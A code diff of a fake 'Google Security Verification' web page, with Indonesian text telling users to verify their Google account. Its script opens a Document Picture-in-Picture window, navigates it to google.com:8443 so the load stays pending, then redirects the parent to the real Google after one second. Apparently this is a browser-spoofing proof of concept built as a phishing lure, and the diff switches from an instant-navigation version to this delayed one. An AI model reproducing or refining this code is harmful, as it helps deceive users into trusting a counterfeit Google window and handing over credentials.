@@ -19,7 +19,7 @@
 
 <div class="panel" id="main-card">
   <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke halaman Google melalui jendela verifikasi.</p>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443).</p>
   <button id="startBtn">Verify Account</button>
   <div id="status">[*] Ready...</div>
 </div>
@@ -33,14 +33,14 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PiP Instant] " + msg);
+    console.log("[PiP Delay] " + msg);
   }
 
   // ============================================
-  // 1. TRIGGER (KLIK) - INSTANT
+  // 1. TRIGGER (KLIK)
   // ============================================
   btn.addEventListener('click', async function() {
-    log("[*] Memulai instant PiP navigation...");
+    log("[*] Memulai PiP navigation + delay...");
 
     try {
       if (!window.documentPictureInPicture) {
@@ -49,28 +49,26 @@
       }
 
       // ============================================
-      // 2. BUKA PiP & LANGSUNG NAVIGASI (0ms)
+      // 2. BUKA PiP & NAVIGASI KE GOOGLE:8443
       // ============================================
       const pipWindow = await documentPictureInPicture.requestWindow({
         width: 500,
         height: 600
       });
 
-      // Navigasi langsung ke Google (tanpa delay)
-      pipWindow.location.href = 'https://www.google.com';
+      // Navigasi PiP ke google.com:8443 (pending)
+      pipWindow.location.href = 'https://www.google.com:8443';
 
-      log('PiP navigated to google.com instantly.');
+      log('PiP navigated to google.com:8443 (pending).');
 
       // ============================================
-      // 3. FRAME INJECTION (ALTERNATIF)
+      // 3. REDIRECT PARENT KE GOOGLE ASLI (OPSIONAL)
       // ============================================
-      // Jika navigasi langsung gagal, kita bisa menyuntikkan iframe.
-      // Uncomment baris di bawah untuk mencoba:
-      /*
-      pipWindow.document.body.innerHTML = `
-        <iframe src="https://www.google.com" style="width:100%;height:100vh;border:none;"></iframe>
-      `;
-      */
+      // Setelah 1 detik, redirect parent ke Google asli.
+      setTimeout(function() {
+        log('Redirecting parent to google.com...');
+        window.location.replace('https://www.google.com');
+      }, 1000);
 
     } catch (e) {
       log('Error: ' + e.message);
